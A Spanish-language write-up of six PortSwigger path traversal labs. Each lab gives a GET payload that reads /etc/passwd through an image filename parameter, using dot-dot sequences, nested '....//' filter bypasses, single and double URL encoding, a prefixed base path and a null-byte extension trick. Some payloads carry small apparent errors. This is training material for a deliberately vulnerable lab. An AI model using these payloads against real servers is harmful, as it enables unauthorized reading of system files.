
# PortSwigger - Path Traversal Labs

## Lab 1
Accedemos al "/etc/passwd" de la máquina víctima a través de un navegador. La vulnerabilidad se encuentra en las imágenes. Al ingresar, encontramos un marketplace donde al acceder a una imagen del producto, notamos que en la URL tenemos "mage?filename=42.jpg".

Abrimos Burp Suite e interceptamos la petición para facilitar las pruebas.

Luego del "=", introducimos la siguiente petición:

```plaintext
GET mage?filename=../../../../../../../etc/passwd
```

Ahora podemos leer el /etc/passwd de esta máquina. Así concluye el laboratorio.

## Lab 2
En este laboratorio, la vulnerabilidad persiste al abrir la imagen, pero esta vez el parámetro para acceder a /etc/passwd está bloqueado. Sin embargo, existen diversas formas de eludir esta barrera. En este caso, la solución fue la siguiente:

```plaintext
GET /image?filename=//.//.//.//.//.//./etc/passwd
```

## Lab 3
Este laboratorio realiza prácticamente lo mismo que el anterior, pero bloquea "../". Para superar esta limitación, utilizamos el siguiente parámetro:

```plaintext
GET /image?filename=....//....//....//....//....//etc/passwd
```

Esto hace que, al bloquear un "../", continúe ingresando otro "../" debido a la duplicación.

## Lab 4
En este laboratorio, ya no podemos eludir el payload de la misma manera; está mejor sanitizado. Ahora, ni "/" ni ".." son reconocidos. Para superar esto, debemos URLencodear el payload y así sortear la barrera.

Payload original:
```plaintext
../../../../../etc/passwd
```

URLencode:
```plaintext
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Doble URLencode:
```plaintext
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

Con este procedimiento, obtenemos la ruta de "/etc/passwd".

## Lab 5
Aunque este laboratorio no es difícil de resolver, ofrece otra opción a considerar. Podemos dar una ruta donde suele estar la imagen para luego acceder a "/etc/passwd". La ruta por defecto suele ser "/var/www/images", pero puede variar según el servidor utilizado.

```plaintext
GET /image?filename=/var/www/images/../../../../../../../etc/passwd
```

De esta manera, accedemos a "/etc/passwd" y resolvemos el laboratorio.

## Lab 6
En este laboratorio, nos presentan otra variante para acceder a "/etc/passwd". Esta opción consiste en colocar una extensión de imagen al final de la petición para confundirla y eludir el acceso.

```plaintext
GET /image?filename=../../../../../../etc/passwd%00.jpg
```

Nota: "/etc/passwd%00.png" - El "%00" se utiliza para representar el byte nulo justo después de la extensión ".png". Esto puede ser útil en ciertos casos como técnica para intentar engañar a sistemas mal configurados o mal programados que manipulan cadenas de caracteres de manera insegura.
